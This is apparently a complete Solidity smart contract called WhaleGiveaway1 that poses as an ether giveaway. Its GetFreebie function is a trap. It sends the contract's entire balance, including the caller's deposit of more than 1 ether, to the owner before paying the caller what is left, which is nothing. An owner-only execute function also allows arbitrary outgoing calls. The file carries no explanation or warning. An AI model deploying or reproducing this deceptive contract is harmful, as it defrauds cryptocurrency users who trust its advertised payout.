pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner;

    function WhaleGiveaway1() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function changeOwner(address newOwner) public {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function execute(address _to, uint _value, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_to.call.value(_value)(_data));
    }
}